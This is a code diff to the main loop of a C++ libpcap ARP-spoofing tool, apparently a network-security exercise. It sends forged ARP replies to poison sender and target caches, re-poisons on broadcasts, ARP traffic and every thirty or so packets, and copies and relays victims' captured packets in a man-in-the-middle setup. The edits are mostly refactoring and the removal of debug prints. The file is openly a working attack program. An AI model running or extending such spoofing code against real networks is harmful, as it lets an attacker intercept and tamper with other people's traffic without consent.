@@ -15,6 +15,7 @@
 #include "attack.h"
 #include "mac.h"
 #include "ip.h"
+#include "iphdr.h"
 
 
 void usage() {
@@ -64,7 +65,7 @@ int main(int argc, char* argv[]) {
         char* sender_ip = argv[i*2 + 2];
         char* target_ip = argv[i*2 + 3];
         mac[i] = (Mac*)malloc(sizeof(Mac));
-        arpPacket[i] = attack_arp(dev,sender_ip , target_ip, pcap, mac[i]);
+        arpPacket[i] = attack_arp(dev, Ip(sender_ip) , Ip(target_ip), pcap, mac[i]);
         // arpPacket[i]->print_arp_packet();
 
         //Set Info
@@ -76,10 +77,10 @@ int main(int argc, char* argv[]) {
     //packet check
     const u_char* packet;
     Ethernet* ethernet ;
-
-    uint32_t count =0 ;
-
+    Iphdr* iphdr ;
+    uint16_t count = 0;
     while (true) {
+
         struct pcap_pkthdr* header;
         // printf("\nWHERE");
 
@@ -94,45 +95,70 @@ int main(int argc, char* argv[]) {
 
 
         ethernet = (Ethernet*) packet;
+        iphdr = get_ip_header(packet+14);
         // printf("\n\n");
         // ethernet->print_ethernet();
         bool flag = false;
         Mac des_ = ethernet->get_d_mac();
-        Mac source = ethernet->get_s_mac();
+        Mac src_ = ethernet->get_s_mac();
+        uint16_t ether_type = ethernet->get_ether_type();
         uint16_t index = 0;
-        uint16_t ether_type;
 
         // printf("broad\n");
 
         //broadcast -> send arp
         if(des_ == Mac("ff:ff:ff:ff:ff:ff")){
-            printf("CATCH BROADCAST!!\n");
+            printf("catch broad\n");
             for(int i=0;i<couple;i++){
                 arp_reply(pcap, arpPacket[i]);
             }
             continue;
-
         }
 
+        // printf("%04x\n", ether_type);
         if(ether_type == 0x0806){
-            printf("CATCH ARP!!!\n");
             for(int i=0;i<couple;i++){
                 arp_reply(pcap, arpPacket[i]);
             }
             continue;
         }
+        // bool temp = false;
+        //
+        // for(int i=0;i<couple;i++){
+        //     if(Ip(iphdr->destination_ip_address) == info[i]->d_ip_ && Ip(iphdr->source_ip_address) == info[i] -> d_ip_){
+        //         for(int j=0;j<couple;j++){
+        //             arp_reply(pcap, arpPacket[i]);
+        //             temp = true;
+        //         }
+        //         continue;
+        //
+        //         if(temp){
+        //             break;
+        //         }
+        //
+        //     }
+
+
+        // }
+
+
+
+
         // printf("hello");
 
         //source same check
         for(int i=0;i<couple;i++){
-            if(source == info[i]->s_mac_){
+            if(src_ == info[i]->s_mac_){
                 index = i;
                 flag = true;
                 break;
 
             }
         }
+
+
         if (flag == true) {
+            // printf("SPOOF!!!\n");
             const int len = header->caplen;
             u_char* spoof_packet = (u_char*)malloc(len);
             memcpy(spoof_packet, packet, len);
@@ -153,9 +179,10 @@ int main(int argc, char* argv[]) {
         flag = false;
 
 
+
+
         if(count > 30){
             for(int i=0;i<couple;i++){
-                printf("SEND ARP!!\n");
                 arp_reply(pcap, arpPacket[i]);
             }
             count = 0;
@@ -163,9 +190,6 @@ int main(int argc, char* argv[]) {
         }
 
         count ++;
-
-
-
     }
 
 
